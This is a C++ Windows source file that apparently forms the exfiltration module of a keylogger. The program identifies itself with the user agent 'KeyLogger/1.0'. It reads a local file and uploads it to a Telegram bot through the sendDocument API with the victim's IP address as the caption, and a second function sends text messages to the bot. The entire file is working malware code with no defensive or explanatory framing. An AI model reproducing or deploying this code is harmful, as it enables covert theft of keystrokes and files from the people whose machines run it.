#include <windows.h>
#include <winhttp.h>
#include <string>
#include <fstream>
#include <vector>
#include <iostream>
#include "get_system_info.h"

#pragma comment(lib, "winhttp.lib")
#pragma execution_character_set("utf-8")

std::vector<char> readFile(const std::wstring& filePath) {
    std::vector<char> data;
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return data;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hFile);
        return data;
    }

    data.resize(fileSize);
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, data.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        data.clear();
    }
    CloseHandle(hFile);
    return data;
}

void sendFileToTelegram(const std::wstring& token, const std::wstring& chat_id, const std::wstring& filePath) {
    std::vector<char> fileData = readFile(filePath);
    if (fileData.empty()) {
        std::wcout << L"Файл пустой\n";
        return;
    }

    std::wstring boundary = L"------------------------7e13971310878";
    std::string boundaryA = "------------------------7e13971310878";
    std::wstring fileName = filePath.substr(filePath.find_last_of(L"\\/") + 1);

    std::string body;
    body += "--" + boundaryA + "\r\n";
    body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
    body += std::string(chat_id.begin(), chat_id.end()) + "\r\n";

    body += "--" + boundaryA + "\r\n";
    body += "Content-Disposition: form-data; name=\"document\"; filename=\"";
    body += std::string(fileName.begin(), fileName.end()) + "\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";
    size_t fileStart = body.size();
    body.resize(body.size() + fileData.size());
    memcpy(&body[fileStart], fileData.data(), fileData.size());
    body += "\r\n";

    std::string caption = "IP: " + getIpAdress();
    body += "--" + boundaryA + "\r\n";
    body += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
    body += caption + "\r\n";

    body += "--" + boundaryA + "--\r\n";

    HINTERNET hSession = WinHttpOpen(L"KeyLogger/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return;
    }

    std::wstring path = L"/bot" + token + L"/sendDocument";
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(),
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + boundary;
    BOOL bResults = WinHttpSendRequest(hRequest,
                                       headers.c_str(), (DWORD)-1L,
                                       (LPVOID)body.data(), (DWORD)body.size(),
                                       (DWORD)body.size(), 0);

    if (bResults)
        WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

void sendMessageToTelegram(const std::wstring& token, const std::wstring& chat_id, const std::wstring& message) {
    std::string body = "chat_id=" + std::string(chat_id.begin(), chat_id.end()) +
                       "&text=" + std::string(message.begin(), message.end());

    HINTERNET hSession = WinHttpOpen(L"KeyLogger/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return;
    }

    std::wstring path = L"/bot" + token + L"/sendMessage";
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(),
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);

    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    std::wstring headers = L"Content-Type: application/x-www-form-urlencoded";
    BOOL bResults = WinHttpSendRequest(hRequest,
                                       headers.c_str(), (DWORD)-1L,
                                       (LPVOID)body.data(), (DWORD)body.size(),
                                       (DWORD)body.size(), 0);

    if (bResults)
        WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}
